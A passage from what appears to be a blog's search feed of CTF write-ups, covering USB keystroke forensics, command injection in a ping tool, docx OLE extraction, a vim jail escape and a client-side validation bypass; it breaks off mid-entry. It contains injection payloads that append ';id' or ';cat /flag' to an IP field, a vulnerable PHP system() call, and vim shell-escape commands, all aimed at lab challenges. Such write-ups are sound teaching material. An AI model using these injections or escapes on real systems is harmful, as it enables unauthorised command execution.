<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pcap-1 Writeup [ACSC 2023]</title>
      <link href="/2023/02/26/pcap-1-Writeup-ACSC-2023/"/>
      <url>/2023/02/26/pcap-1-Writeup-ACSC-2023/</url>
      
        <content type="html"><![CDATA[<p>Category : Forensics</p><p>Difficulty : Warm-up</p><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Here is a packet capture of my computer when I was preparing my presentation on Google Slides. Can you reproduce the contents of the slides?</span><br><span class="line"></span><br><span class="line">Note: If you find a &quot;fake flag&quot;, submit it here. Some text next to the flag says that it is not accepted, but now it is. There are 2 flags in the challenge, and both are accepted. Part 1 accepts the flag that is easier to get.</span><br><span class="line"></span><br><span class="line">flag format: ACSC\&#123;[ -~]+\&#125;</span><br></pre></td></tr></table></figure><hr><p>We are given a relatively large pcap file with a size of 184 MB. Let’s open it in Wireshark and take a look. The first thing I always check when I get a large pcap file is checking the <em>Protocol Hierarchy</em> tab from the <em>Statics</em> menu to see what protocols are used, we can also take a look at the <em>Capture File Properties</em> to see how many packets the capture has [401193 packets ] and how long it has been running [00:09:50] this is probably not related to the challenge but it is always good to look at.</p><p>The protocols used in the capture are as follows </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F590d80b4-8ae5-4741-bd80-b6f6a4928bae%2FUntitled.png?id=a789bd28-3daa-4b55-bb35-32440fdd8bb0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>there is no interesting things in particular but if we look at the actual communication we can see some usb keystrokes being captured which is unusual so let’s export them but first apply the following as filter in Wireshark so we can only see the keystrokes </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.transfer<span class="emphasis">_type == 0x01 &amp;&amp; usb.bInterfaceClass==3</span></span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F590d80b4-8ae5-4741-bd80-b6f6a4928bae%2FUntitled.png?id=a789bd28-3daa-4b55-bb35-32440fdd8bb0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>Now I am going to highlight all the packets and go to <em>File &gt; Export Specified Packets</em></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F61b64d3d-ec24-4647-862f-d36a823fb1af%2FUntitled.png?id=cf32ec57-7c89-4bbc-9c90-f03d662ab623&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>and save them as new file which am gonna call <em>filtered.pcapng</em></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6213dfba-ad09-4a2e-b566-3ba3fa6bb471%2FUntitled.png?id=e16116a9-7d8e-4004-a8d1-ba0a23f1ba51&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1360&userId=&cache=v2" alt="wshark"></p><p>Now let’s use <em>tshark</em> to extract the data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r filtered.pcapng -Y <span class="string">&#x27;usb.capdata &amp;&amp; usb.data_len == 8&#x27;</span> -T fields -e usb.capdata</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fba697056-09c6-4bbf-ba8a-cb36d7d303f0%2FUntitled.png?id=c084635a-55d2-498e-9a95-ccc26384cc7d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>We can see a lot of output so am gonna redirect it to a file which am gonna call <em>output.txt</em> and use <code>sed</code> to add the <code>:</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r filtered.pcapng -Y <span class="string">&#x27;usb.capdata &amp;&amp; usb.data_len == 8&#x27;</span> -T fields -e usb.capdata | sed <span class="string">&#x27;s/../:&amp;/g2&#x27;</span> &gt; output.txt</span><br></pre></td></tr></table></figure><p>The output should look like this </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ffcbe9327-66bb-4594-9ca7-9f6584de5f52%2FUntitled.png?id=8bbc78d6-ec03-4ac8-b44b-dbac5854ebb2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=690&userId=&cache=v2" alt="wshark"></p><p>Finally let’s use this python script right here to parse the data and convert it to human readable</p><p><a href="https://github.com/carlospolop-forks/ctf-usb-keyboard-parser">https://github.com/carlospolop-forks/ctf-usb-keyboard-parser</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python usbkeyboard.py output.txt</span><br></pre></td></tr></table></figure><p>We got our data and what it looks like a flag starting with <code>ACSC&#123;</code>. However there are many repeated chars  </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7cf24553-f014-47d6-8d84-cd7945ebc8f1%2FUntitled.png?id=79af4a09-668f-4e08-ba4f-5752c8384d68&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>am gonna write some code to clean it a bit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"></span><br><span class="line">cleaned_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">    <span class="keyword">if</span> c == <span class="number">0</span> <span class="keyword">or</span> text[c] != text[c-<span class="number">1</span>]:</span><br><span class="line">        cleaned_text += text[c]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cleaned_text)</span><br></pre></td></tr></table></figure><p>this looks so much better but still there are some repeated ‘a’ and ‘b’</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faa9a0e05-2e81-434f-be0d-b1206890a42e%2FUntitled.png?id=de218f70-0757-46cb-8892-3e5472582aa9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="wshark"></p><p>but we can get the flag by removing the extra chars manually</p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Looking Glass [HTB]</title>
      <link href="/2022/09/16/Looking-Glass/"/>
      <url>/2022/09/16/Looking-Glass/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Category : Web</p></blockquote><blockquote><p>Difficulty : Easy</p></blockquote><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We&#x27;ve built the most secure networking tool in the market, come and check it out!</span><br></pre></td></tr></table></figure><p>We are given an IP address and a port to connect to , we are not provided with a source code. If we open the website we find the following interface</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F247b2777-0d17-413a-8f33-dccc4e65733f%2FUntitled.png?id=c192f3dd-81d5-4a7e-90d4-f7ebcb8dab17&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="website"><br>We can do the commands <strong>ping</strong> and <strong>traceroute</strong> on an IP address that we can provide<br><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8d35d575-bbf5-42a9-b6cf-cf9dadd3dd8a%2FUntitled.png?id=248a0390-982b-44e3-a8c1-814014cb7850&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="commands"><br>Some of you might already spotted the vulnerability here. However, let’s open BurpSuite and take a look at the request that was made when we click <strong>Test.</strong></p><p>The request is as follow<br><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5adb7c50-a6b3-45a1-aa90-c1120f1efb6b%2FUntitled.png?id=6a345f88-b63f-45cf-a6e4-298323873689&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="request"><br>It is a post request that has 3 parameters <code>test</code> , <code>ip_address</code> and <code>submit</code> .</p><p>If we try to put another command for example <code>id</code> in the place of <code>ping</code> we don’t get anything back </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=id&amp;ip_address=134.122.104.185&amp;submit=Test</span><br></pre></td></tr></table></figure><p>But what if we put that after the IP address like this</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=ping&amp;ip_address=134.122.104.185;id&amp;submit=Test</span><br></pre></td></tr></table></figure><p>And indeed the command id was executed successfully and we can see its output in the response</p><p>This vulnerability is called <code>command injection</code> ( you can read more about it from here <a href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a> ) </p><p>Now that we can execute any command , let’s take a look at the files available and perhaps we can find the flag. In our current directory we have an <em>index.php</em> file let’s see its content </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runTest</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$ip_address</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> === <span class="string">&#x27;ping&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c4 $&#123;ip_address&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> === <span class="string">&#x27;traceroute&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;traceroute $&#123;ip_address&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The vulnerable part of the code is here </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c4 $&#123;ip_address&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>It’s passing the parameters to bash without sanitizing it **to remove potential injection, so we can execute any other command by simply putting <code>;</code> after the first one </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c4 $&#123;ip_address&#125; ; whoami&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Getting-the-flag"><a href="#Getting-the-flag" class="headerlink" title="Getting the flag"></a>Getting the flag</h3><p>There was no flag in the current directory but what about the root directory, if we do <code>ls -al /</code> </p><p>we can see that there is our flag file </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--   <span class="number">1</span> root root   <span class="number">37</span> Nov  <span class="number">2</span>  <span class="number">2020</span> flag_gzmmt</span><br></pre></td></tr></table></figure><p>Let’s cat it </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=ping&amp;ip_address=<span class="number">134.122</span>.<span class="number">104.185</span>;cat+/flag_gzmmt&amp;submit=Test</span><br></pre></td></tr></table></figure><p>And we got our flag</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdbf24a18-8cec-434e-855b-4bd2db32a3e2%2FUntitled.png?id=1a7d714d-4bc8-4c92-880d-bee431a53931&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=870&userId=&cache=v2" alt="flag"></p><p><code>HTB&#123;I_f1n4lly_l00k3d_thr0ugh_th3_rc3&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hacker&#39;s Playground 2022 Writeup - DocxArchive</title>
      <link href="/2022/08/23/Hacker-s-Playground-2022-Writeup-DocxArchive/"/>
      <url>/2022/08/23/Hacker-s-Playground-2022-Writeup-DocxArchive/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Categories : Rev &#x2F; Misc</p></blockquote><blockquote><p>Points : 110</p></blockquote><blockquote><p>Solves : 101</p></blockquote><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I developed a simple and useful program that attaches a file into word file. But... why I cannot open file?</span><br><span class="line">I thought I developed perfect program, but it was not true. Wait, where is the source file?</span><br><span class="line">I cannot find my attachment file! I think I need to extract attachment file from word.</span><br></pre></td></tr></table></figure><p>We are given a <code>RecoverMe.docx</code> file to download. It is a Microsoft Word 2007+ file. If we try to open it we get an error saying that it is corrupted. We know that a <code>docx</code> or any microsoft file are in fact zip files , they have the same header <code>PK</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4f3e526b-4820-4828-aa4c-c77586ab3a3d%2FUntitled.png?id=8c11b012-59e5-46dd-a8ae-4641cb11852f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1430&userId=&cache=v2" alt="xxd"></p><p>We can then unzip the file like a normal zip</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F45bc5568-244e-4650-8818-bd1c5ae3fba5%2FUntitled.png?id=95d34201-c79b-47be-8c27-df6ab8e0ccb9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=990&userId=&cache=v2" alt="unzip"></p><p>If we unzip we get some other files attached to it. </p><p>The <code>oleObject1.bin</code> file inside the <code>/word/embeddings</code> looks interesting </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feee01055-a27b-4933-8a16-b15059ddb0a1%2FUntitled.png?id=50d28f83-c8b1-4984-b8df-a6eafdf5077e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1400&userId=&cache=v2" alt="ole"></p><p>Looking at the hexdump we notice a string saying “Open-Me.bin” . looking back at the name of the file <code>oleObject1.bin</code>, If you will recall, OLE stands for <em>Object Linking and Embedding</em>. Microsoft documents allow a user to link or embed objects into a document. An object that is <em>linked</em>  to a document will store that data outside of the document. If you update the data outside of the document, the link will update the data inside of your new document.</p><p>An <em>embedded</em> object becomes a part of the new file. It does not retain any sort of connection to the source file. This is perfect way for attackers to hide or obfuscate code inside a malicious document.</p><p>Usually when working with files like that there is a tool that comes in handy which is <code>oledump.py</code> , you can find it here <a href="https://blog.didierstevens.com/programs/oledump-py/">https://blog.didierstevens.com/programs/oledump-py/</a> </p><p>Basically we need to look for streams inside the docx file and extract them. To do this let’s use the following command </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python /opt/oledump/oledump.py RecoverMe.docx</span><br></pre></td></tr></table></figure><p>We get the following output and as you can see the second stream looks suspicious so let’s extract it </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4cc82040-62eb-43e6-b478-00e91b430c5b%2FUntitled.png?id=9f698a29-a34c-48f2-9712-0753934599b6&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1150&userId=&cache=v2" alt="oledump"></p><p>I am going to use the following command to extract the <code>A2</code> stream and redirect the output to a file called <code>Ole10Native.bin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python /opt/oledump/oledump.py RecoverMe.docx -s A2 -d &gt; Ole10Native.bin</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa7b88b1e-732c-408d-bb75-fff4dfd98d73%2FUntitled.png?id=e0daf2ae-2ed1-4dfa-94e0-ea3bbfb94d58&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=880&userId=&cache=v2" alt="extract"></p><p>If we take a look at the hexdump we notice a <em>png</em> file chunks </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fad921702-c7ae-48a9-9680-2e7f32e528db%2FUntitled.png?id=93f09bba-5d6c-4565-9d0e-6b4aa0573d78&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1410&userId=&cache=v2" alt="pngchunk"></p><p>Let’s open the file in <code>HxD</code> so we can extract the png image. </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fffc9a109-fedd-40ed-b6f6-a391a9615630%2FUntitled.png?id=4962f7e8-fc20-4c06-b7c0-9d09f23a8bc0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1310&userId=&cache=v2" alt="hxd"></p><p>We need to select from the <code>‰PNG</code> part all the way to the <code>IEND</code> chunk , copy the selection, open a new file in HxD and paste it in there , then save the file with a <code>.png</code> extension.</p><p>Looking at the png image we can see our flag :D</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7498c5a7-a5b8-462c-8f83-165fea72710f%2Flol.png?id=35c2a9c9-fad5-4823-9826-a2f37b7eeca7&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=600&userId=&cache=v2" alt="flag"></p><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://clickallthethings.wordpress.com/2021/03/06/oleobject1-bin-ole10native-shellcode/">https://clickallthethings.wordpress.com/2021/03/06/oleobject1-bin-ole10native-shellcode/</a></p><p><a href="https://blog.didierstevens.com/2014/12/17/introducing-oledump-py/">https://blog.didierstevens.com/2014/12/17/introducing-oledump-py/</a></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THE TEXT EDITOR JAIL writeup [247CTF]</title>
      <link href="/2022/08/17/THE-TEXT-EDITOR-JAIL-writeup-247CTF/"/>
      <url>/2022/08/17/THE-TEXT-EDITOR-JAIL-writeup-247CTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We didn&#x27;t have time to setup and test a proper jail, so this text editor will have to do for now. Can you break free</span><br></pre></td></tr></table></figure><p>We are given a website that when we connect to we get a <code>vim</code> over a <code>ttyd</code> web terminal. This challenge is straightforward and pretty simple we just need to escape the vim prompt in order to get the flag.</p><p>If we do some research on how to escape vim we come across this amazing blog post from <code>hacktricks</code> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash</a></p><p>What we are interested in is this part right here</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff46d0699-bc71-425c-b1ba-d3575003ecad%2FUntitled.png?id=0c8d7ee4-54a9-478e-9505-a9c4c3f5bd3c&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1540&userId=&cache=v2" alt="Untitled"></p><p>We can also find it in ****<a href="https://gtfobins.github.io/gtfobins/vim/">GTFOBins</a>.**</p><p>So by typing those two lines we should be able to get a shell and therefore get the flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>Let’s try it</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb8b59783-2e8d-42a7-b7f3-99a0dfb6b947%2FUntitled.png?id=788e6f21-3881-4dba-9d82-38b6a042c883&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=690&userId=&cache=v2" alt="Untitled"></p><p>It worked! We got our flag</p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiceCTF @ HOPE Writeups</title>
      <link href="/2022/07/22/DiceCTF-HOPE-Writeups/"/>
      <url>/2022/07/22/DiceCTF-HOPE-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="flag-viewer"><a href="#flag-viewer" class="headerlink" title="flag-viewer"></a><strong>flag-viewer</strong></h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p><a href="https://flag-viewer.mc.ax/">https://flag-viewer.mc.ax/</a></p><p>We got a the following webpage and two files <code>app.py</code>,<code>server.py</code></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9d493564-6556-47c6-9a7a-dd977a77fe7d%2FUntitled.png?id=b9523606-da0c-4ec4-b678-7bdd9529c182&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1940&userId=&cache=v2" alt="site"></p><p>The most important part in the source code in<code>app.py</code> is the following </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.post(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.post()</span><br><span class="line">    user = data.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?message=Only the &quot;admin&quot; user can see the flag!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">f&#x27;/?message=<span class="subst">&#123;os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag missing!&quot;</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>So basically if the username we enter is <code>admin</code> we should get the flag . Really! that’s so easy , let’s try. Oh turned out it is not that easy smh </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe53fe37a-53dd-47c6-9366-315d308a09a7%2FUntitled.png?id=86d5b70c-10ed-485f-b310-a26faea65641&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1870&userId=&cache=v2" alt="site2"></p><p>If we type another username we get the following message</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only the &quot;admin&quot; user can see the flag!</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F632af7fc-f546-4969-beb5-a33c01a28bb0%2FUntitled.png?id=38356bf1-f13a-41ac-9160-a8129b0aea55&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1900&userId=&cache=v2" alt="site3"></p><p>It is time to try something else then . Let’s open <strong>Burp Suite,</strong> send a request and then see what happens behind the scenes </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F58956257-e7b4-4cb9-9a6b-8118daac2623%2FUntitled.png?id=0141cd81-2c06-4e98-a7a3-a25a787295df&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="burp"></p><p>In this case it is sending a post request with the parameter being <code>user</code> which contains the username we entered. </p><p>If you notice there is a redirection to another page let’s click that </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbd598d20-2788-4355-9c17-57b52a64ad06%2FUntitled.png?id=bc913554-815c-4788-8043-66eb13a4a1c8&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web"></p><p>We got redirected to another page which has a GET parameter <code>message</code> containing the message we saw before </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?message=Only+the+%22admin%22+user+can+see+the+flag!</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fae58d249-6246-4dc5-b49a-4bcb956d6dbe%2FUntitled.png?id=1b4f2546-f2a8-4f98-9bb5-06d8fec6c5e2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web"></p><blockquote><p>Solution</p></blockquote><p>If we go back to the previous request and change the username to <code>admin</code> from there would that work ? let’s try </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd7f19a7f-bbd5-4788-aa2b-3350f29e3b6b%2FUntitled.png?id=87111b6b-78c2-4685-a67c-9eb51178bb2e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web"></p><p>Boom that worked , you can see the flag and the redirection to the page containing our flag. If we follow it we get what we came for 😀</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9be7788-5002-40f0-988c-962057fa468a%2FUntitled.png?id=6bf91751-ddfe-4a9c-a080-848f7548c2df&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web"></p><p>Flag : <code>hope&#123;oops_client_side_validation_again&#125;</code></p><hr><h2 id="inspect-me"><a href="#inspect-me" class="headerlink" title="inspect-me"></a><strong>inspect-me</strong></h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a><strong>Challenge Description</strong></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 